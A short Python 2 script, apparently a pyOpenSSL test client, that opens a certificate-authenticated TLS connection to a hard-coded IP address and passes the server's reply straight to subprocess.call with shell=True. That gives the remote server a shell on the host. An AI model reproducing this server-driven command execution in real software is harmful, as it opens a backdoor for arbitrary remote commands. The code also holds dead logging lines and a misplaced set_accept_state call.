#!/usr/bin/env python

import socket
import time
import OpenSSL
import subprocess

RECV_BUFFER = 4096
    
def verify(connection, x509, errnum, errdepth, ok):
    return ok
    print '_verify (ok=%d):' % ok
    print '  subject:', x509.get_subject()
    print '  issuer:', x509.get_issuer()
    print '  errnum %s, errdepth %d' % (errnum, errdepth)
    return ok

if __name__ == '__main__':
    where = ('200.200.60.205',50000)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(where)
    
    ctx = OpenSSL.SSL.Context(OpenSSL.SSL.TLSv1_METHOD)
    ctx.use_certificate_file('/usr1/hcsjad/python_scripts/openssl/simple/client.cert')
    ctx.use_privatekey_file('/usr1/hcsjad/python_scripts/openssl/simple/client.pkey')
    ctx.load_verify_locations('/usr1/hcsjad/python_scripts/openssl/simple/CA.cert')
    ctx.set_verify(OpenSSL.SSL.VERIFY_PEER|OpenSSL.SSL.VERIFY_FAIL_IF_NO_PEER_CERT,verify) # just means we want to verify the server too (requires that we have the certificate chain root available--CA.cert)
    
    # tie the socket and context together in a connection
    conn = OpenSSL.SSL.Connection(ctx, s)
    conn.set_accept_state()
    
    conn.sendall('1.0') # send version string (3 chars)
    
    results = conn.recv(RECV_BUFFER) #recv(s)
    print 'from server: %s' % `results`
    
    #subprocess.Popen(results, shell=True)
    retcode = subprocess.call(results, shell=True)
    
    conn.sendall('all done')
    
    conn.shutdown()
